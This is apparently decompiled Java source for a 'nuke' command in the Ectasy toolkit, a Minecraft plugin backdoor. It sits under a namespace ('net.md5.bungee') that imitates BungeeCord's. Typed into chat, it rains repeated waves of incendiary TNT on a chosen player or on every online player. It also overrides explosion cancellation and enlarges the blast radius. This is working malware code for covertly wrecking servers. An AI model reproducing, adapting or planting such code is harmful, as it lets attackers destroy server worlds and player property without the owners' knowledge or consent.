package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.ExplosionPrimeEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.util.Vector;

@CommandInfo(
   name = "nuke",
   description = "Nuke someone",
   blatant = true,
   rank = Rank.FREE
)
public class NukeCommand extends AbstractCommand implements Listener {
   public NukeCommand() {
   }

   @EventHandler
   public void onEntityExplode(ExplosionPrimeEvent var1) {
      if (var1.getEntity().getType() == EntityType.PRIMED_TNT) {
         if (var1.getEntity().getCustomName() == null) {
            return;
         }

         if (var1.getEntity().getCustomName().equalsIgnoreCase("§cNuke")) {
            var1.setCancelled(false);
            var1.setRadius(10.0F);
         }
      }
   }

   public static void doTnt(Player var0) {
      Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
         int var1 = 2;
         int var2 = 16;

         for (int i = 0; i < 16; i++) {
            double var4 = (double)i * Math.PI / (double)(var2 / 2);
            double var6 = (double)var2 * Math.PI / (double)(var2 / 2);
            double var8 = Math.cos(var4) * (double)var1;
            double var10 = Math.cos(var6) * (double)var1;
            double var12 = Math.sin(var4) * (double)var1;
            double var14 = Math.sin(var6) * (double)var1;
            Vector vec = new Vector(var10 - var8, 0.0, var14 - var12);
            TNTPrimed tnt = (TNTPrimed)var0.getWorld().spawnEntity(var0.getLocation().add(0.0, 1.0, 0.0), EntityType.PRIMED_TNT);
            tnt.setFuseTicks(i * 10 + 45);
            tnt.setCustomName("§cNuke");
            tnt.setIsIncendiary(true);
            tnt.setVelocity(tnt.getVelocity().add(vec));
         }
      });
   }

   public static void nuke(Player var0) {
      new Thread(() -> {
         for (int i = 0; i < 9; i++) {
            doTnt(var0);
            try {
               Thread.sleep(1000L);
            } catch (InterruptedException e) {
               throw new RuntimeException(e);
            }
         }
      }).start();
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length != 1) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use nuke <player name> or nuke *");
      } else if (!var3[0].equals("*")) {
         Player var6 = Bukkit.getServer().getPlayer(var3[0]);
         if (var6 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The player " + var3[0] + " is not online.");
         } else {
            nuke(var6);
            ChatUtil.sendChat(var1.getPlayer(), "Nuked " + var6.getName());
         }
      } else {
         for(Player var5 : Bukkit.getOnlinePlayers()) {
            nuke(var5);
         }

         ChatUtil.sendChat(var1.getPlayer(), "Nuked everyone.");
      }
   }
}
